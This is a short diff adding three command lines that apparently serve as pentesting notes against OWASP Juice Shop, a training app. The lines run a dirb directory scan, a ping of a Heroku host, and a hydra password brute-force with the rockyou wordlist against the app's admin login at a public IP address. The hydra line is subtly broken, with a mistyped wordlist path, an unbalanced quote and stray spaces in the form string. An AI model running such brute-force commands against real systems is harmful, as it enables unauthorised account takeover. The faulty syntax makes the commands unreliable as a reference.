@@ -1,0 +1,3 @@
+dirb http://localhost:3000 /usr/share/wordlists/dirb/common.txt -v | grep admin
+Ping -c 1 juice-shop.herokuapp.com
+hydra -l admin@juice-sh.op -P /user/share/wordlists/rockyou.txt 54.220.192.176 https-post-form “/rest/user/login:email=^USER^ & password=^PASS^:F=Invalid email or password -V -I
